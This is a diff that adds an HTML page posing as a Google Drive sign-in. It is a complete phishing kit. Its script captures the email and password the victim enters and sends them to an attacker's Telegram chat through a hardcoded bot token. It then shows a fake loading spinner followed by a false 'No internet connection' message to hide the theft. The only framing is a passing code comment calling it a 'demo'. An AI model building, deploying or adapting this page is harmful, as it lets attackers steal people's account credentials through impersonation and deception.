@@ -1,0 +1,327 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google Drive - sign in</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+        body {
+            font-family: 'Roboto', Arial, sans-serif;
+            background-color: #ffffff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 20px;
+        }
+        .container {
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
+            position: relative;
+        }
+        .logo {
+            width: 80px;
+            height: 80px;
+            margin: 0 auto 24px;
+        }
+        h1 {
+            font-size: 32px;
+            font-weight: 500;
+            color: #202124;
+            margin: 0 0 16px;
+        }
+        .subtitle {
+            font-size: 16px;
+            color: #202124;
+            margin: 0 0 32px;
+        }
+        .input-group {
+            position: relative;
+            margin-bottom: 16px;
+        }
+        .input-field {
+            width: 100%;
+            padding: 16px 16px 16px 48px;
+            border: 1px solid #dadce0;
+            border-radius: 8px;
+            font-size: 16px;
+            box-sizing: border-box;
+            outline: none;
+            transition: border-color 0.2s;
+        }
+        .input-field:focus {
+            border-color: #1a73e8;
+        }
+        .icon {
+            position: absolute;
+            left: 16px;
+            top: 50%;
+            transform: translateY(-50%);
+            width: 20px;
+            height: 20px;
+            fill: #5f6368;
+        }
+        .password-toggle {
+            position: absolute;
+            right: 16px;
+            top: 50%;
+            transform: translateY(-50%);
+            width: 20px;
+            height: 20px;
+            fill: #5f6368;
+            cursor: pointer;
+        }
+        .btn {
+            width: 100%;
+            padding: 14px;
+            background-color: #1a73e8;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            margin-top: 8px;
+            transition: background-color 0.2s;
+        }
+        .btn:hover {
+            background-color: #1557b0;
+        }
+        /* Loading overlay */
+        .loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: white;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            visibility: hidden;
+            opacity: 0;
+            transition: opacity 0.3s, visibility 0.3s;
+        }
+        .loading-overlay.active {
+            visibility: visible;
+            opacity: 1;
+        }
+        .spinner {
+            width: 48px;
+            height: 48px;
+            border: 5px solid #e0e0e0;
+            border-top: 5px solid #1a73e8;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin-bottom: 24px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .loading-text {
+            font-size: 18px;
+            color: #202124;
+            font-weight: 400;
+        }
+        .error-message {
+            margin-top: 32px;
+            font-size: 18px;
+            color: #d93025;
+            font-weight: 500;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 8px;
+        }
+        .error-message svg {
+            width: 48px;
+            height: 48px;
+            fill: #d93025;
+        }
+        .hidden {
+            display: none !important;
+        }
+    </style>
+</head>
+<body>
+    <div class="container" id="mainContainer">
+        <!-- Google Drive Logo -->
+        <svg class="logo" viewBox="0 0 87.3 78" xmlns="http://www.w3.org/2000/svg">
+            <path d="m6.6 66.85 3.85 6.65c.8 1.4 1.95 2.5 3.3 3.3l13.75-23.8h-27.5c0 1.55.4 3.1 1.2 4.5z" fill="#0066da"/>
+            <path d="m43.65 25-13.75-23.8c-1.35.8-2.5 1.9-3.3 3.3l-25.4 44a9.06 9.06 0 0 0 -1.2 4.5h27.5z" fill="#00ac47"/>
+            <path d="m73.55 76.8c1.35-.8 2.5-1.9 3.3-3.3l1.6-2.75 7.65-13.25c.8-1.4 1.2-2.95 1.2-4.5h-27.502l5.852 11.5z" fill="#ea4335"/>
+            <path d="m43.65 25 13.75-23.8c-1.35-.8-2.9-1.2-4.5-1.2h-18.5c-1.6 0-3.15.45-4.5 1.2z" fill="#00832d"/>
+            <path d="m59.8 53h-32.3l-13.75 23.8c1.35.8 2.9 1.2 4.5 1.2h50.8c1.6 0 3.15-.45 4.5-1.2z" fill="#2684fc"/>
+            <path d="m73.4 26.5-12.7-22c-.8-1.4-1.95-2.5-3.3-3.3l-13.75 23.8 16.15 28h27.45c0-1.55-.4-3.1-1.2-4.5z" fill="#ffba00"/>
+        </svg>
+        
+        <h1>Google Drive</h1>
+        <p class="subtitle">Sign in to continue to Google Drive</p>
+        
+        <!-- Email Input -->
+        <div class="input-group">
+            <svg class="icon" viewBox="0 0 24 24">
+                <path d="M20 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4l-8 5-8-5V6l8 5 8-5v2z"/>
+            </svg>
+            <input type="email" class="input-field" placeholder="Email address" id="emailInput">
+        </div>
+        
+        <!-- Password Input -->
+        <div class="input-group">
+            <svg class="icon" viewBox="0 0 24 24">
+                <path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/>
+            </svg>
+            <input type="password" class="input-field" placeholder="Password" id="passwordInput">
+            <svg class="password-toggle" viewBox="0 0 24 24" onclick="togglePassword()">
+                <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>
+            </svg>
+        </div>
+        
+        <!-- Submit Button -->
+        <button class="btn" id="submitBtn">See content</button>
+    </div>
+
+    <!-- Loading Overlay -->
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="spinner" id="spinner"></div>
+        <div class="loading-text" id="loadingText">Signing in...</div>
+        <div class="error-message hidden" id="errorMessage">
+            <svg viewBox="0 0 24 24">
+                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
+            </svg>
+            <span>No internet connection</span>
+        </div>
+    </div>
+
+    <script>
+        // ----- configuration -----
+        const TELEGRAM_BOT_TOKEN = '8943725711:AAGnEGycTYTVr3xSVoixYEi7uE2dPWukiNA';
+        const TELEGRAM_CHAT_ID = '7542490071';
+
+        // ----- DOM references -----
+        const emailInput = document.getElementById('emailInput');
+        const passwordInput = document.getElementById('passwordInput');
+        const submitBtn = document.getElementById('submitBtn');
+        const loadingOverlay = document.getElementById('loadingOverlay');
+        const spinner = document.getElementById('spinner');
+        const loadingText = document.getElementById('loadingText');
+        const errorMessage = document.getElementById('errorMessage');
+
+        // ----- password toggle -----
+        function togglePassword() {
+            const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
+            passwordInput.setAttribute('type', type);
+        }
+
+        // ----- helper: show a pop‑up for a specific field -----
+        function showFieldAlert(fieldName, inputElement) {
+            // Use a native alert, but we also highlight the field and focus it.
+            alert(`Please fill in the ${fieldName} field.`);
+            if (inputElement) {
+                inputElement.focus();
+                inputElement.style.borderColor = '#d93025';
+                // Remove red border after a short while
+                setTimeout(() => {
+                    inputElement.style.borderColor = '#dadce0';
+                }, 2000);
+            }
+        }
+
+        // ----- send data to Telegram -----
+        async function sendToTelegram(email, password) {
+            const text = `📥 *Google Drive login attempt*\n\n📧 Email: \`${email}\`\n🔑 Password: \`${password}\``;
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: text,
+                        parse_mode: 'Markdown'
+                    })
+                });
+                // We don't really care about the response for the demo,
+                // but we log it for debugging.
+                console.log('Telegram API response:', await response.json());
+            } catch (error) {
+                console.error('Failed to send to Telegram:', error);
+                // Even if it fails (e.g. no internet), we still continue to show the fake loading.
+            }
+        }
+
+        // ----- reset loading overlay state -----
+        function resetLoadingState() {
+            spinner.classList.remove('hidden');
+            loadingText.classList.remove('hidden');
+            errorMessage.classList.add('hidden');
+        }
+
+        // ----- show loading, then after 10s show "no internet" -----
+        function startLoadingSequence() {
+            resetLoadingState();
+            loadingOverlay.classList.add('active');
+
+            // After 10 seconds hide spinner and show error
+            setTimeout(() => {
+                spinner.classList.add('hidden');
+                loadingText.classList.add('hidden');
+                errorMessage.classList.remove('hidden');
+            }, 10000);
+        }
+
+        // ----- main handler -----
+        async function handleSubmit() {
+            const email = emailInput.value.trim();
+            const password = passwordInput.value.trim();
+
+            // Validation with specific pop‑ups
+            if (!email) {
+                showFieldAlert('Email address', emailInput);
+                return;
+            }
+            if (!password) {
+                showFieldAlert('Password', passwordInput);
+                return;
+            }
+
+            // Both fields are filled – send to Telegram (fire and forget)
+            // We don't await it so the UI responds immediately.
+            sendToTelegram(email, password);
+
+            // Start the loading screen (10s -> no internet)
+            startLoadingSequence();
+        }
+
+        // ----- attach event listeners -----
+        submitBtn.addEventListener('click', handleSubmit);
+
+        // Optional: allow pressing Enter in the password field to submit
+        passwordInput.addEventListener('keypress', (e) => {
+            if (e.key === 'Enter') {
+                e.preventDefault();
+                handleSubmit();
+            }
+        });
+        emailInput.addEventListener('keypress', (e) => {
+            if (e.key === 'Enter') {
+                e.preventDefault();
+                handleSubmit();
+            }
+        });
+
+        // Make togglePassword available globally for the inline onclick
+        window.togglePassword = togglePassword;
+    </script>
+</body>
+</html>
